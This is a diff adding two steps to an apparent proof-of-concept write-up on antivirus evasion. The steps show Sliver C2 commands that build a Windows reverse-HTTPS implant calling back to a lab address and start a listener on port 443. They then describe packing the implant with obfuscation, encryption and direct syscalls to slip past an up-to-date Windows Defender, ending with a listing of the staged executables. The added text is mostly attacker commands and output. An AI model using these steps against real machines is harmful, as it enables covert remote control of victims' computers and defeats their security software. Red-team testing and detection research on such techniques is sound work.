@@ -217,3 +217,41 @@ sliver >
 PoC - Step 3 - Generate a SLIVER implant (reverse HTTPS payload) and set up a SLIVER HTTPS handler
 ===========================================================================================================================================
 
+[server] sliver > generate --arch amd64 -f exe --http 192.168.56.104 --save /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe --os Windows
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 2m6s
+[*] Implant saved to /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe
+
+
+[server] sliver > https --lhost 192.168.56.104 --lport 443
+
+[*] Starting HTTPS :443 listener ...
+
+[*] Successfully started job #1
+
+[server] sliver >  
+
+
+====================================================================================================================================================
+PoC - Step 4 - Generate a packed version of the SLIVER implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
+====================================================================================================================================================
+
+Our packed version of the SLIVER implant is using obfuscation, encryption and compression techniques, direct syscalls (etc...) to avoid AV detection.
+
+CC:\temp> dir 
+ Volume in drive C is Windows
+ Volume Serial Number is 9C9C-7212
+
+ Directory of C:\temp
+
+02/01/2023  04:00    <DIR>          .
+02/01/2023  04:00    <DIR>          ..
+23/12/2022  00:51         5,407,744 Packed-SliverRevShell.exe
+31/12/2022  06:51        18,218,496 SliverRevShell2.exe
+               2 File(s)     23,626,240 bytes
+               2 Dir(s)  93,179,334,656 bytes free
+               
+               
+               
